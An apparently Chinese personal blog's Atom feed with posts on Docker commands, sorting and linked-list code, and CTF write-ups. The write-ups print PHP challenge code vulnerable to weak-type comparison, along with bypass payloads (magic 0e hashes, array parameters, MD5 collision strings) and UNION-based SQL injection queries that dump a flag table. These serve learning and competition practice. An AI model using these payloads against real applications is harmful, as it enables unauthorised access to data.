<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ZclusLLoye&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zcluslloye.cn/"/>
  <updated>2018-04-25T07:17:35.834Z</updated>
  <id>http://zcluslloye.cn/</id>
  
  <author>
    <name>ZclusLLoye</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker常用命令汇总</title>
    <link href="http://zcluslloye.cn/2018/04/24/docker/"/>
    <id>http://zcluslloye.cn/2018/04/24/docker/</id>
    <published>2018-04-24T12:20:00.000Z</published>
    <updated>2018-04-25T07:17:35.834Z</updated>
    
    <content type="html"><![CDATA[<p>最近事有点多，一直没啥时间写文章。但是忙不能成为不学习的理由，还是抽空写下文章吧。<br><br>因为出题目的原因，docker也开始频繁使用了，之前看了两本docker相关的书，但都不满意书的内容，可能是写的太杂太乱。借这个机会总结一下常用的命令方便自己忘记的时候查找吧。<br><br>搜索docker镜像：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search [镜像名]</span><br><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure><br>下载镜像:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像名]</span><br></pre></td></tr></table></figure><br>列出所有已下载的镜像:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><br>启动一个容器并绑定端口挂载目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//后台方式启动</span><br><span class="line">docker run -dit -p [主机端口]:[容器端口] -v [主机目录]:[docker目录] --name [命名容器名称] [镜像名]:[标签] </span><br><span class="line">//创建完直接进入容器</span><br><span class="line">docker run -it -p [主机端口]:[容器端口] -v [主机目录]:[docker目录] --name [命名容器名称] [镜像名]:[标签] </span><br></pre></td></tr></table></figure><br>列出所有容器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><br>进入一个容器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [容器ID]</span><br></pre></td></tr></table></figure><br>从容器中退出:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//后台继续运行容器</span><br><span class="line">Ctrl+p+q</span><br><span class="line">//退出并停止容器</span><br><span class="line">Ctrl+d</span><br></pre></td></tr></table></figure><br>启动/关闭/重启容器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器ID] //适用于已创建的容器</span><br><span class="line">docker stop [容器ID]</span><br><span class="line">docker restart [容器ID]</span><br></pre></td></tr></table></figure><br>将容器保存为镜像:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit [容器ID] [新镜像名称]:[新镜像标签] </span><br></pre></td></tr></table></figure><br>docker的命令还有很多，这里只列出了部分常用的，比如dockerfile的使用我就没用列出来。其他如果以后常用再接着补上吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近事有点多，一直没啥时间写文章。但是忙不能成为不学习的理由，还是抽空写下文章吧。&lt;br&gt;&lt;br&gt;因为出题目的原因，docker也开始频繁使用了，之前看了两本docker相关的书，但都不满意书的内容，可能是写的太杂太乱。借这个机会总结一下常用的命令方便自己忘记的时候查找吧。
      
    
    </summary>
    
    
      <category term="linux" scheme="http://zcluslloye.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>经典算法之冒泡排序</title>
    <link href="http://zcluslloye.cn/2018/04/11/bubblesort/"/>
    <id>http://zcluslloye.cn/2018/04/11/bubblesort/</id>
    <published>2018-04-11T12:22:00.000Z</published>
    <updated>2018-04-17T12:48:23.047Z</updated>
    
    <content type="html"><![CDATA[<p>冒泡排序法应该是大家最初接触到的排序算法，冒泡排序法简单而且非常容易理解，下面我就以升序为例讲解。<br>设数组的长度为N，比较相邻的两个元素，把其中大的那个数交换放在后面。对第0个到第N-1个数进行遍历之后，最大的数已经“沉”到最后一个，接下来对第0个到第N-2个数进行遍历，直到排序完成。<br><br><br>很容易就写出源码。</p><h2 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void BubbleSort(int a[], int n)  </span><br><span class="line">&#123;  </span><br><span class="line">       int i, j;  </span><br><span class="line">       for (i = 0; i &lt; n; i++)  </span><br><span class="line">              for (j = 1; j &lt; n - i; j++)  </span><br><span class="line">                     if (a[j - 1] &gt; a[j])  </span><br><span class="line">                            swap(a[j - 1], a[j]);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>显然，冒泡排序法的时间复杂度为n*n，效率低下，对于大数组不建议使用冒泡排序法。当然<a href="https://blog.csdn.net/morewindows/article/details/6657829" target="_blank" rel="noopener">网上</a>也有许多对冒泡排序法的优化，这里我便不详讲。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;冒泡排序法应该是大家最初接触到的排序算法，冒泡排序法简单而且非常容易理解，下面我就以升序为例讲解。&lt;br&gt;设数组的长度为N，比较相邻的两个元素，把其中大的那个数交换放在后面。对第0个到第N-1个数进行遍历之后，最大的数已经“沉”到最后一个，接下来对第0个到第N-2个数进行遍
      
    
    </summary>
    
    
      <category term="算法" scheme="http://zcluslloye.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP弱类型总结</title>
    <link href="http://zcluslloye.cn/2018/03/30/php-weak1/"/>
    <id>http://zcluslloye.cn/2018/03/30/php-weak1/</id>
    <published>2018-03-30T12:30:34.000Z</published>
    <updated>2018-03-31T10:07:52.953Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近强网杯还有其他比赛中，出现了许多php弱类型的题目。用这篇文章总结一下到目前学到的php弱类型。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>学过php的都知道，php中有两种比较符==和===。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较<br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>如果一个字符串和数字比较，则字符串会被转换成数值。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;abc&quot;==0);  //true</span><br><span class="line">var_dump(&quot;1abc&quot;==1); //true</span><br><span class="line">var_dump(&quot;0abc&quot;==0); //true</span><br><span class="line">var_dump(&quot;abc1&quot;==1); //false</span><br><span class="line">var_dump(&quot;abc0&quot;==1); //false</span><br><span class="line">var_dump(&quot;0e123&quot;==&quot;0e456&quot;);//true</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>当”abc”==0 比较时，abc会被转换成数值，由于是字符串所以abc转换成0<br>而abc0和abc1却等于false，这是因为一个字符串刚开始的值决定了这个字符串的数值，如果该字符串以合法的数值开始，则使用该数值，否正值为0。例如1abc为true,0abc为false<br>而0e开头的字符串会被识别为科学记数法，而0的多少次方都为0，所以0e123==0e456.</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><p>json绕过我在<a href="http://zcluslloye.cn/2018/03/12/hgame-web" target="_blank">web篇总结1</a>中有稍微提到过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>]))&#123;</span><br><span class="line">    $pattern = <span class="string">'/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/'</span>;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$key)===<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"format error"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $lock<span class="string">"************"</span>;</span><br><span class="line">        $b = json_decode($key);</span><br><span class="line">        <span class="keyword">if</span>($b==$lock)</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wrong key"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输入一个json类型的字符串进行json_decode，判断key是否等于lock的值，但是lock的值我们不知道，但是我们可以利用前面所说的0==”string”来绕过。而要求key要含有字母，我们就可以用0e开头的字符串来实现。<br>payload：key=0e123456</p><h2 id="strcmp漏洞绕过"><a href="#strcmp漏洞绕过" class="headerlink" title="strcmp漏洞绕过"></a>strcmp漏洞绕过</h2><p>要求 php -v &lt; 5.3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;str1&apos;])&amp;&amp;isset($_GET[&apos;str2&apos;]))&#123;</span><br><span class="line">    if($_GET[&apos;str1&apos;]!=$_GET[&apos;str2&apos;] &amp;&amp; strcmp($_GET[&apos;str1&apos;],$_GET[&apos;str2&apos;])==0)</span><br><span class="line">        echo $flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;error...&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>strcmp函数在php中用与比较两个字符串。<br>那如果传入的参数为数组会怎样呢？<br>我们传入str1[]=1&amp;str2[]=2,这时函数接受了不符合的类型，会返回NULL==NULL，也就判断类型相等。<br>payload：str1[]=1&amp;str2[]=2</p><h2 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;a&apos;]))&#123;</span><br><span class="line">    $pattern = &apos;/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;4,&#125;$/&apos;;</span><br><span class="line">    $a = $_GET[&apos;a&apos;];</span><br><span class="line">    if(preg_match($pattern,$a)===0)&#123;</span><br><span class="line">        echo &quot;format error&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        switch($a)&#123;</span><br><span class="line">            case 1:</span><br><span class="line">                echo &quot;error..&quot;;</span><br><span class="line">                break;</span><br><span class="line">            case 2:</span><br><span class="line">                echo &quot;error..&quot;;</span><br><span class="line">                break;</span><br><span class="line">            case 3:</span><br><span class="line">                echo &quot;error..&quot;;</span><br><span class="line">                break;</span><br><span class="line">            case 4:</span><br><span class="line">                echo $flag;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>原理和之前讲的大同小异，由于有正则表达式进行匹配所以a中必须含有字母，利用”4abc”==4便可绕过switch<br>payload：a=4abc</p><h2 id="MD5类型绕过"><a href="#MD5类型绕过" class="headerlink" title="MD5类型绕过"></a>MD5类型绕过</h2><p>强网杯web签到题就出了三道绕过MD5函数的题目，下面就以这道来总结一下。<br>第一关：</p><h3 id="MD5弱类型"><a href="#MD5弱类型" class="headerlink" title="MD5弱类型"></a>MD5弱类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;str1&apos;])&amp;&amp;isset($_GET[&apos;str2&apos;]))&#123;</span><br><span class="line">    if($_GET[&apos;str1&apos;] != $_GET[&apos;str2&apos;] &amp;&amp; md5($_GET[&apos;str1&apos;]) == md5($_GET[&apos;str2&apos;]))</span><br><span class="line">        echo $flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;something error...&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第一关就是传入两个字符串，两个字符串不相等，但是md5加密后相等，前面提到过0e开头的字符串在比较时会被视为科学记数法，所以两个0e开头的字符串会被认为相等。即：md5(‘s878926199a’) == md5(‘QNKCDZO’)<br>在网上找了一些md5加密后为0e开头的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure><br>payload：str1=QNKCDZO&amp;str2=s878926199a</p><p>第二关：</p><h3 id="MD5数组绕过"><a href="#MD5数组绕过" class="headerlink" title="MD5数组绕过"></a>MD5数组绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;str1&apos;])&amp;&amp;isset($_GET[&apos;str2&apos;]))&#123;</span><br><span class="line">    if($_GET[&apos;str1&apos;] !== $_GET[&apos;str2&apos;] &amp;&amp; md5($_GET[&apos;str1&apos;]) === md5($_GET[&apos;str2&apos;]))</span><br><span class="line">        echo $flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;something error...&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由于MD5比较换成了强类型，这就导致参数传入且MD5加密后被转换成了相同的类型之后才进行比较，所以以0e开头的字符串不再以数值来进行比较，而由于md5函数无法处理数组，我们可以传入数组，md5函数就会返回NULL，也就判断NULL===NULL，成功绕过。<br>payload：str1[]=1&amp;str2[]=2<br>之前的md5弱类型也可以用此方法绕过。由此可知，数组可以绕过很多函数，例如strcmp还有md5。<br><br></p><p>第三关：</p><h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;str1&apos;])&amp;&amp;isset($_GET[&apos;str2&apos;]))&#123;</span><br><span class="line">    if((string)$_GET[&apos;str1&apos;] !== (string)$_GET[&apos;str2&apos;] &amp;&amp; md5($_GET[&apos;str1&apos;]) === md5($_GET[&apos;str2&apos;]))</span><br><span class="line">        echo $flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;something error...&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关就不再属于弱类型了。由于先将参数转为<br>string后，如果我们传入数组会返回NULL，导致NULL==NULL，第一个条件绕过失败。<br>所以我们需要找到两个md5值相等的字符串。有这样的字符串吗？还真有。<br><a href="https://www.mscs.dal.ca/~selinger/md5collision/" target="_blank" rel="noopener">https://www.mscs.dal.ca/~selinger/md5collision/</a><br>资料里给出了两个字符串的16进制值，我们只需要将两个16进制值转为字符串提交即可。但需要注意，由于有不可见字符需要使用脚本提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1 = &quot;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&quot;</span><br><span class="line">str2 = &quot;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&quot;</span><br></pre></td></tr></table></figure><br>脚本就不贴了。记得decode(‘hex’)就行了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这些也只是php弱类型的一点点知识而已，还有更多的东西没有写出来(其实我不会了)。<br>之前很早就想写这篇文章，一直拖到现在，不过也好，又学到了新的知识一起写到文章里了。<br>学习永远都是靠自己一个人，别人再厉害也只是别人而已，只有自己脚踏实地才能学到真的知识。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近强网杯还有其他比赛中，出现了许多php弱类型的题目。用这篇文章总结一下到目前学到的php弱类型。&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>记一次有趣的二次注入</title>
    <link href="http://zcluslloye.cn/2018/03/29/second-sqli/"/>
    <id>http://zcluslloye.cn/2018/03/29/second-sqli/</id>
    <published>2018-03-29T12:22:00.000Z</published>
    <updated>2018-03-30T15:12:28.722Z</updated>
    
    <content type="html"><![CDATA[<p>上周强网杯和安恒杯结束了，一直没有时间整理比赛中学习的知识，其实会做的题也不多，但学习的确实挺多，今天就来聊聊强网杯的一道较为简单的注入题。<br>题目是一道二次注入类型。二次注入是为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这些数据却又在“未被转义（Unescaped）”的查询窗体中重复使用。例如下面这道题目：<br>刚开始就给你一个注册页面，注册发现age参数存在注入点<br><img src="https://miao.su/images/2018/03/30/4efc9e.png" alt="4efc9e.png"><br>由于要求age必须为数字便采用hex绕过。随后便是常规的注入手法。<br><br>先判断列数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222 order by x#   //x为数字</span><br></pre></td></tr></table></figure><br>随后发现222 union select 1,2,3,4#依旧只有第一个参数有回显，便用and 1=2把222的参数回显注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">222 and 1=2 union select 1,2,3,4# //发现联合查询的第二个参数有回显</span><br><span class="line">222 and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()# //表名</span><br><span class="line">222 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_schema=database()#  //列名</span><br></pre></td></tr></table></figure><br><img src="https://miao.su/images/2018/03/30/85f176.png" alt="85f176.png"><br>得到表名和列名都是flag。接下来字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222 and 1=2 union select 1,flag,3,4 from flag# </span><br></pre></td></tr></table></figure><br><img src="https://miao.su/images/2018/03/30/9c298f.png" alt="9c298f.png"><br>拿到flag。<br>这次强网杯比赛中学到了新的注入姿势，和队友的比赛时也学到了其他许多东西。下次聊聊php弱类型，还有常见的php类型绕过。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上周强网杯和安恒杯结束了，一直没有时间整理比赛中学习的知识，其实会做的题也不多，但学习的确实挺多，今天就来聊聊强网杯的一道较为简单的注入题。&lt;br&gt;题目是一道二次注入类型。二次注入是为了预防SQL注入攻击，而将输入到应用程序中的某些数据进行了“转义（escape）”，但是这
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://zcluslloye.cn/tags/CTF/"/>
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>单向链表的学习</title>
    <link href="http://zcluslloye.cn/2018/03/23/polynomial/"/>
    <id>http://zcluslloye.cn/2018/03/23/polynomial/</id>
    <published>2018-03-23T13:09:53.000Z</published>
    <updated>2018-03-25T13:35:39.647Z</updated>
    
    <content type="html"><![CDATA[<p>最近慢慢地在学习算法，数据结构也越来越难理解，正好碰见一道题目来复习单向链表，使用一元多项式表示多项式并求和。<br>对于链表，结构体中得包含指向下一个节点的指针。<br>这道题的重点在于如何去表示多项式，并且如何去比较指数并相加。<br>先定义结构体并将结构体指针化：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">float</span> coef; <span class="comment">//系数</span></span><br><span class="line">    <span class="keyword">int</span> expn;   <span class="comment">//指数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span> <span class="comment">//指向下一个节点的指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">linklist</span>;</span>  <span class="comment">//将结构指针化</span></span><br></pre></td></tr></table></figure></p><p>之后我的想法是头节点不存放多项式，从第二个节点来进行存储。两个多项式p,q都输入完毕后开始进行比较：如果p的第一项指数比q的第一项指数小，就把p的下一项和q的这一项比较；如果指数相等，就把两项的系数相加；如果p的指数大，那就把q的这一项插入到p的前一项。之后就把其他的代码写出就完成了。这就是大体的思路。</p><h1 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">float</span> coef; <span class="comment">//系数</span></span><br><span class="line">    <span class="keyword">int</span> expn;   <span class="comment">//指数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span> <span class="comment">//指向下一个节点的指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">linklist</span>;</span>  <span class="comment">//将结构指针化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreatPolyn</span><span class="params">(linklist p, <span class="keyword">int</span> m)</span> <span class="comment">//生成一个新的多项式</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    linklist head = p;</span><br><span class="line">    head-&gt;coef = <span class="number">0.0</span>; head-&gt;expn = <span class="number">-1</span>; head-&gt;next = <span class="literal">NULL</span>; <span class="comment">//设置头节点指数为-1，不存储多项式</span></span><br><span class="line">    p 